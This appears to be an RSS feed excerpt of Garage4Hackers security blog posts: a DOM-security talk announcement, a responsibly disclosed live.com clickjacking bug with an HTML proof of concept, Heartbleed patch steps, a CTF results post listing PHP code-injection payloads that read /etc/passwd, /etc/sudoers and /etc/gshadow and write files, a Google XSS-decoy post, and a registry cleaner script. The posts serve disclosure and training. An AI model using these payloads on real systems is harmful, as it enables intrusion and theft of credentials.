				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=13550#post13550" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">Garage October month RWS series, our  rancho Author<b> Mario Heiderich</b><br />
<br />
Title : <br />
In the DOM- no one will hear you scream <br />
<br />
Recorded Video.
<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/5W-zGBKvLxk?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
Abstract<br />
This talk is about the DOM and its more twilight areas. Well see the weird parts and talk about where and why this might be security<br />
critical and affect your precious online applications, browser extensions or packaged apps. To understand the foundations of what the<br />
DOM has become by today, we'll further explore the historical parts - who created the DOM, what was the intention and how fought dirty about<br />
it during the browser wars.<br />
<br />
Finally, we'll see a DOM based attack called &quot;DOM Clobbering&quot;. An attack, that is everything but obvious and affected a very popular and<br />
commonly used Rich Text Editor. Be prepared for a lot of tech-talk as well as fear and loathing in the browser window. But don't shed no<br />
tears, there's a tool that fixes the security crazy for you and this talk will present it.<br />
<br />
Registration Link :<br />
<a href="https://docs.google.com/forms/d/1qezCOA4EhsRmUH0jtARO68uj_16oOSmXhGi61L_jJUY/viewform" target="_blank">https://docs.google.com/forms/d/1qez..._jJUY/viewform</a><br />
<br />
<img src="https://pbs.twimg.com/media/BxvCQ1xCYAEpnEz.png" border="0" alt="" /></div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3085</guid>
		</item>
		<item>
			<title>UI redress attack on live.com (affected all pages).</title>
			<link>http://garage4hackers.com/entry.php?b=2597</link>
			<pubDate>Thu, 17 Apr 2014 05:44:30 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
On 7/29/13 I've reported Live.com XFO vulnerability to the *Microsoft Security team* and finally their investigation...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=13364#post13364" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">On 7/29/13 I've reported Live.com XFO vulnerability to the <b>Microsoft Security team</b> and finally their investigation came to conclusion and fixed the bug. So, Here is details of bug and timeline of fixing bug. A year ago on the weekend, I started digging into MS services for bugs and this vulnerability seems to be more interesting to share on the <b>Garage4Hackers</b>. <br />
<br />
The timeline of investigation of the bug : July 29, 2013 - April 16 , 2014. <br />
<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=683&amp;d=1397713464" border="0" alt="Name:  msresponse.jpg
Views: 2019
Size:  23.1 KB"  style="float: CONFIG" /><br />
<br />
The interesting part of the vulnerability all pages were protected for <b> UI Addressing Attack </b> and while doing testing, normally I test application on the all browsers. The weird part comes here, I was able to iframe the all the pages of Live.com including pre-authentication and post-authentication pages on Mozilla Firefox 3.6.28 to Mozilla Firefox 6. On Chrome and on other browser all pages functionality of XFO was working perfectly. <br />
<br />
Random announcement , nothing do with this post : Check out recorded video of <a href="https://www.youtube.com/watch?v=Qk0ORbFZ81I" target="_blank">Garage4Hackers Ranchoddas Webcast Series - Browser Crash Analysis By David Rude II aka Bannedit  </a><br />
Note : Have look the same vulnerability on <a href="http://www.garage4hackers.com/showthread.php?t=2528" target="_blank">Facebook Application Installing </a><br />
<br />
Obviously , you must be thinking why this thing is happening with Mozilla. After doing some research and consulting with <b>G4H team</b> , I've concluded, it may be issue with <b>Gecko Engine</b>.  The test environment was win 7 , ubuntu 10,11,12. <br />
Note :  If you stumbled upon on the same issue of Gecko, then please do reply on this thread. :)<br />
<br />
Check out the following headers , XFO header is missing on Gecko/20120306 Firefox/3.6.28 to MF 6.  <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">        https://blu166.mail.live.com/m/?bfv=wm

        GET /m/?bfv=wm HTTP/1.1
        Host: blu166.mail.live.com
        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-us,en;q=0.5
        Accept-Encoding: gzip,deflate
        Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
        Keep-Alive: 115
        Connection: keep-alive
        Cookie:


        HTTP/1.1 200 OK
        Content-Type: text/html; charset=utf-8
        Content-Encoding: gzip
        Vary: Accept-Encoding
        Server: Microsoft-IIS/7.5
        X-Wlp-StartTime: 29-07-2013 10:10:32 AM
        xxn: 22
        P3P: CP=&quot;BUS CUR CONo FIN IVDo ONL OUR PHY SAMo TELo&quot;
        MSNSERVER: H: BLU166-W22 V: 17.1.6722.6001 D: 2013-07-22T22:56:20
        X-Powered-By: ASP.NET
        Content-Length: 3113
        Date: Mon, 29 Jul 2013 10:10:32 GMT
        Connection: keep-alive
        Set-Cookie: bfv=wm; domain=.live.com; path=/
        Set-Cookie: widecontext=X; path=/; secure
        Set-Cookie: domain=.live.com; path=/
        Set-Cookie: xidseq=7; domain=.live.com; path=/
        Set-Cookie: LD=; domain=.live.com; expires=Mon, 29-Jul-2013 08:30:32 GMT; path=/
        Cache-Control: no-cache, no-store, must-revalidate, no-transform
        Pragma: no-cache
        Expires: -1, -1</pre>
</div>Here is some print screen of basic operations of live.com (I would like to remind you , every page of live.com was vulnerable :rolleyes: )<br />
<br />
Attacker developed this page to attack on victim. <br />
<br />
<img src="https://dl.dropboxusercontent.com/u/18007092/ms-click1.png" border="0" alt="" /><br />
<br />
<b>Composing Email : </b><br />
<br />
<img src="https://dl.dropboxusercontent.com/u/18007092/ms-click2.png" border="0" alt="" /><br />
<br />
<b>Uploading Attachment : </b><br />
<br />
<img src="https://dl.dropboxusercontent.com/u/18007092/ms-click3.png" border="0" alt="" /><br />
<br />
<b>Deleting Emails : </b><br />
<br />
[IMG]https://dl.dropboxusercontent.com/u/18007092/ms-click4.png[IMG]<br />
<br />
HTML POC , which i used sent to MS Security Team <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">&lt;html&gt;
&lt;!-- This Quick Developed POC , for testing purpose --!&gt;
&lt;!-- Visit Garage4hackers.com  --!&gt;
&lt;head&gt;
	&lt;title&gt; Live Mail Send Clickjacking - Garage4hackers.com &lt;/title&gt;
	&lt;style&gt;
		iframe { 
		  width:800px;
		  height:800px;
		  position:absolute;
		  top:0; left:0;
		  filter:alpha(opacity=50); /* in real life opacity=0 */
		  opacity:0.5;
		}
	&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;br&gt;
	&lt;br&gt;
	&lt;br&gt;
	&lt;br&gt;
	&lt;br&gt;
	&lt;br&gt;
	&lt;br&gt;
	&lt;br&gt;
&lt;div&gt;&lt;center&gt;Bhag Milkha Bhag Competition&lt;/center&gt;&lt;/div&gt;
&lt;center&gt;&lt;b&gt;Click Connect, You will Bhag Muilkha Bhag T-shirts. &lt;/b&gt;&lt;/center&gt;

    &lt;iframe src=&quot;https://blu166.mail.live.com/m/compose.m/?fid=00000000-0000-0000-0000-000000000001&amp;to=sandeepk.l337@gmail.com&quot;&gt;&lt;/iframe&gt;
	&lt;a href=&quot;http://www.google.com&quot; target=&quot;_blank&quot; style=&quot;position: relative; left: 0px; top: 220px; z-index: -1;&quot;&gt;Connect&lt;/a&gt;

&lt;/body&gt;
&lt;/html&gt;</pre>
</div>Let me know if you have any question about this bug :)<br />
<br />
<br />
- [S]</div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=2597</guid>
		</item>
		<item>
			<title>How to Fix OpenSSL Heart Bleed Bug on Ubuntu</title>
			<link>http://garage4hackers.com/entry.php?b=2552</link>
			<pubDate>Wed, 09 Apr 2014 03:47:47 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
First check version of the openSSL 
 
 
Code: 
--------- 
openssl version -b 
 
openssl version -a]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=13342#post13342" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">First check version of the openSSL<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:60px;">openssl version -b

openssl version -a</pre>
</div>If it is already updated, then no need to worry about it . If your OpenSSL is not updated then execute following commands to update OpenSSL. <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">sudo apt-get update</pre>
</div>Once this finishes, upgrade openssl:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">sudo apt-get upgrade openssl</pre>
</div>Regenerate your SSL certificate , follow the link to regenerating SSL Certificate <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;"> https://www.digitalocean.com/community/articles/how-to-create-a-ssl-certificate-on-apache-for-ubuntu-12-04</pre>
</div>Video Guide :<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">https://www.youtube.com/watch?v=sq7Eib02Rb8</pre>
</div></div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=2552</guid>
		</item>
		<item>
			<title>Garage4Hackers CTF Web Level 1 challenge result</title>
			<link>http://garage4hackers.com/entry.php?b=1354</link>
			<pubDate>Fri, 27 Dec 2013 12:12:07 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
The Garage4Hackers CTF level 1 challenge came to life on 25th December, 2013 at 10:30 PM IST.  It saw nice...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=12694#post12694" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">The Garage4Hackers CTF level 1 challenge came to life on 25th December, 2013 at 10:30 PM IST.  It saw nice participation from across the globe with some really creative attempts to crack the challenge. It took us some serious judging to filter out the top attempts. Finally we are done with it. And now we are pleased to announce the results of our Level 1 challenge !!<br />
<br />
<b>The Challenge was 54.197.234.66/index.php?wish=hohohoSanta :</b><br />
<br />
To try to execute simple PHP code or pwn the server and try to update the 54.197.234.66/updateme.txt. <br />
<br />
Also,<br />
<br />
safemode=on<br />
<br />
List of disabled functions:<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">dl,exec, passthru, shell_exec, system, proc_open, popen ,curl_exec, curl_multi_exec , parse_ini_file, show_source, url_exec, syslog, pcntl_alarm, pcntl_fork, pcntl_waitpid, pcntl_wait, pcntl_wifexited, pcntl_wifstopped, pcntl_wifsignaled ,pcntl_wexitstatus, pcntl_wtermsig, pcntl_wstopsig, pcntl_signal, pcntl_signal_dispatch, pcntl_get_last_error, pcntl_strerror, pcntl_sigprocmask, pcntl_sigwaitinfo, pcntl_sigtimedwait, pcntl_exec, pcntl_getpriority, pcntl_setpriority, allow_url_fopen, allow_url_include, stream_select</pre>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:72px;">expose_php = Off
display_errors = Off
track_errors = Off
html_errors = Off</pre>
</div><b>Vulnerability Description : </b><br />
<br />
I would like to give special thanks to David Vieira-Kurz(@secalert) for finding this awesome bug on Ebay. This kind of vulnerability was less known until lately when it shot to limelight (<a href="http://www.secalert.net/2013/12/13/ebay-remote-code-execution/" target="_blank">http://www.secalert.net/2013/12/13/e...ode-execution/</a>) . We decided to make Level 1 challenge based on this vulnerability and tried to emulate the same flaw as in the case of eBay. For more details on the vulnerability check following blogs. <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">http://www.secalert.net/2013/12/13/ebay-remote-code-execution/
http://gynvael.coldwind.pl/n/ebay_rce_analysis_wrong_question_mark</pre>
</div><br />
<b>Submissions from approximately 400 participants </b><br />
<br />
We saw approximately 400 individual participants looking to grab the prize. Payload attempts ranged from the blunt nessus scanners to really cool “insert the coolest attack here ”attacks. <br />
We have decided to release the total apache log generated during the challenge. <b>You can download it by emailing us</b>. Top submissions are based on best payload and then 1st come 1st out basis in case of same payload.<br />
<br />
<b>Top submissions</b><br />
<br />
<br />
<b>1. Xelenonz Lp. </b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:180px;">http://54.197.234.66/index.php?wish[]=x

http://54.197.234.66/index.php?wish={${phpinfo()}}

 http://54.197.234.66/index.php?wish={${highlight_file('./index.php')}}

http://54.197.234.66/index.php?wish={${file_put_contents('updateme.txt','Xelenonz',FILE_APPEND)}};

http://54.197.234.66/index.php?wish={${eval($_GET['code'])}}&amp;code=file_put_contents('updateme.txt','Xelenonz',FILE_APPEND);

http://54.197.234.66/index.php?wish={${print_r(glob(&quot;/tmp/*&quot;))}}

http://54.197.234.66/index.php?wish={${print_r(scandir($_GET['dir']))}}&amp;dir=/tmp</pre>
</div><b>2. Pichaya Morimoto(LongCat) </b><br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:132px;">http://54.197.234.66/index.php?wish={${readfile('/tmp/lnz')}}

http://54.197.234.66/index.php?wish={${include('/tmp/lnz')}}

http://54.197.234.66/index.php?wish={${print_r(stat(&quot;updateme.txt&quot;))}}

http://54.197.234.66/index.php?wish={${file_put_contents(&quot;/tmp/lnz&quot;,base64_decode(&quot;PD9waHAgcGhwaW5mbygpOyA/Pg==&quot;))}}

http://54.197.234.66/index.php?wish=/index.php?wish={${read_file('index.php')}}</pre>
</div><b>3. Mykola Ilin - solarwind [Defcon Ukraine]</b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:132px;">http://54.197.234.66/index.php?wish=${include &quot;/proc/cpuinfo&quot;}

http://54.197.234.66/index.php?wish=${include &quot;/etc/passwd&quot;}

http://54.197.234.66/index.php?wish=${var_dump(glob(&quot;/proc/self/fd/*&quot;))}

http://54.197.234.66/index.php?wish=${var_dump(glob(&quot;/etc/*&quot;))}

http://54.197.234.66/index.php?/index.php?wish=${file_put_contents(&quot;updateme.txt&quot;,&quot;\\nsolarwind\\n&quot;,FILE_APPEND)}</pre>
</div><b>4. Pedro [tunelko] </b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:132px;">http://54.197.234.66/index.php?wish=${var_dump(base64_decode('PD8gcGhwaW5mbygpOyBkaWUoKTs/Pg=='))}

http://54.197.234.66/index.php?wish=${var_dump(file_get_contents('/etc/sudoers'))}

http://54.197.234.66/index.php?wish=${var_dump(file_get_contents('/etc/gshadow'))}

http://54.197.234.66/index.php?wish=${var_dump(ini_get('disable_functions'))}

http://54.197.234.66/index.php?wish=${file_put_contents(&quot;updateme.txt&quot;,&quot;\nsolarwind\n&quot;,FILE_APPEND)}</pre>
</div><b>5. Nishant </b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:132px;">54.197.234.66/index.php?wish={${phpinfo()}}

54.197.234.66/index.php?wish={${file_put_contents('updateme.txt','nishant.dp@gmail.com at Thu, 26/12/2013 1:25AM IST')}}

<b>6. Bharadwaj Machiraju</b>

54.197.234.66/index.php?wish={${phpinfo()}}

http://54.197.234.66/index.php?wish=${file_put_contents(&quot;updateme.txt&quot;, &quot;\ntunnelshade\n&quot;, FILE_APPEND)}</pre>
</div><b>7. Piyush Pattanayak</b><br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:60px;">54.197.234.66/index.php?wish={${phpinfo()}}

54.197.234.66/index.php?wish=shoes({${file_put_contents('updateme.txt', 'Piyush Pattanayak', FILE_APPEND)}})</pre>
</div>-------------------------------------------------------------------------<br />
Note: Everyone tried execute PHP Curly Syntax as per our log information .However we can also execute the PHP code in the following way. <br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:48px;">http://54.197.234.66/index.php?wish=%22%2bphpinfo%28%29%2b%22
http://54.197.234.66/index.php?wish=&quot;.phpinfo().&quot;</pre>
</div>-------------------------------------------------------------------------<br />
<br />
<br />
AND THE WINNERS ARE   <br />
<br />
<b>Xelenonz Lp. and Solarwind </b><br />
<br />
<img src="https://dl.dropboxusercontent.com/u/18007092/L33t%20T-shit%20G4h.jpg" border="0" alt="" /><br />
<br />
Special thanks all participant &amp; of course gear up for Level 2 :)<br />
<br />
Thank you !<br />
[S]</div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=1354</guid>
		</item>
		<item>
			<title>Google Fake XSS</title>
			<link>http://garage4hackers.com/entry.php?b=428</link>
			<pubDate>Tue, 18 Sep 2012 05:46:30 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
Supb Guys , Year ago i seeking Bugs in Google Applications. I found one bug which is already know to Google , in...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=8849#post8849" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">Supb Guys , Year ago i seeking Bugs in Google Applications. I found one bug which is already know to Google , in fact Google added this vulnerability to make fool (Newbies). After a long time waiting , i have deiced to release it !  <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:36px;">Fake Vuln URL  : https://www.google.com/appserve/security-bugs/new?rl=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E</pre>
</div>Google used common payload to make fool ! :rolleyes: <br />
<br />
It was wired for me when i use alert(1) , it was popping 41 As show in the following image. <br />
<br />
<img src="https://dl.dropbox.com/u/18007092/sa.png" border="0" alt="" /><br />
<br />
Fake Alert Generating JS Code <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:276px;">&lt;script&gt;
    (function(){
        var sel = document.getElementById('f-Category');
        var inp = document.getElementById('f-Category-Other');
        setInterval(function(){
            if(sel.value == &quot;other&quot; &amp;&amp; sel.style.display != 'none'){
                inp.style.display = 'block';
                sel.style.display = 'none';
                inp.focus();
                inp.onblur = function(){
                    if (inp.value == '' &amp;&amp; inp.style.display == 'block'){
                        sel.style.display = 'block';
                        inp.style.display = 'none';
                        sel.value = 'none';
                    }
                }
            }
         },100);
         eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('5(4.3.6(/2\\([\'&quot;]a[\'&quot;]\\)/))2(\'c\');7 5(4.3.6(/2\\([0-9]/))2(b);7 5(4.3.6(/2\\(8.d/))2(\'q.0.0.1\');7 5(4.3.6(/2\\(8.f/))4.3=\'g://h.i/j/k-l-m-n-o/p.e\';',27,27,'||alert|href|location|if|match|else|document||xss|42|excesses|domain|aspx|cookie|http|allrecipes|com|Recipe|Beths|Spicy|Oatmeal|Raisin|Cookies|Detail|127'.split('|'),0,{})); 
    })();
  &lt;/script&gt;</pre>
</div>As you can see the eval function which is responsible for alerting 41 ... You can use anyother payload to alert different different output ! <br />
<br />
PS: I Don't know some one already known it !  Coz its my very old finding :) <br />
<br />
Thanks <br />
Sandeep Aka [S]</div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=428</guid>
		</item>
		<item>
			<title><![CDATA[[PY] G4H// Anti-Intruders  System Cleaner ver 0.1]]></title>
			<link>http://garage4hackers.com/entry.php?b=137</link>
			<pubDate>Sat, 11 Jun 2011 20:09:18 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
Simple release  
:)  
 
 
Code: 
--------- 
#!/usr/bin/env python 
from pickle import *]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=4241#post4241" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">Simple release <br />
:) <br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:372px;">#!/usr/bin/env python
from pickle import *
from struct import *
from _winreg import *
print &quot;\n&quot;
print &quot;\n\t##################################################&quot;
print &quot;\t#                                                #&quot;
print &quot;\t#                                                #&quot;
print &quot;\t#G4H// Anti-Intruders  System Cleaner ver 0.1    #&quot;
print &quot;\t#                                                #&quot;
print &quot;\t#        Silic0n@ G4H//Anti-Intruders            #&quot;
print &quot;\t#                                                #&quot;
print &quot;\t##################################################&quot;
print &quot;\n&quot;
print &quot;\n[*] you can use this script for the Systems with the following properties&quot;
print &quot;\n  [+] Task Manager Disabled&quot;
print &quot;\n  [+] Registry Disabled&quot;
print &quot;\n  [+] Hidden Drives&quot;
print &quot;\nTask-Manager Enabled&quot;
path = HKEY_CURRENT_USER
path_t = &quot;Software\Microsoft\Windows\CurrentVersion\Policies\System&quot;
hKey = OpenKey(path,path_t,0,KEY_READ|KEY_SET_VALUE)
SetValueEx(hKey,&quot;DisableTaskMgr&quot;,0,REG_DWORD,0)
print &quot;\nFixing the Hidden Drivers problem&quot;
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Current Version \ Policies\Explorer
path = HKEY_CURRENT_USER
path_t = &quot;Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot;
hKey = OpenKey(path,path_t,0,KEY_READ|KEY_SET_VALUE)
SetValueEx(hKey,&quot;NoDrive&quot;,0,REG_DWORD,0)
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System
print &quot;\nfixing the access to registry editor tools&quot;
path = HKEY_CURRENT_USER
path_t = &quot;Software\Microsoft\Windows\CurrentVersion\Policies\System&quot;
hKey = OpenKey(path,path_t,0,KEY_READ|KEY_SET_VALUE)
SetValueEx(hKey,&quot;DisableRegistryTools&quot;,0,REG_DWORD,0)
path = HKEY_CURRENT_USER
print &quot;\nFixing the Folder Option Disabled Problem&quot;
path_t = &quot;Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot;
hKey = OpenKey(path,path_t,0,KEY_READ|KEY_SET_VALUE)
SetValueEx(hKey,&quot;NoFolderOptions&quot;,0,REG_DWORD,0)
DeleteValue(hKey,&quot;NoFolderOptions&quot;)</pre>
</div></div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=137</guid>
		</item>
	</channel>
</rss>
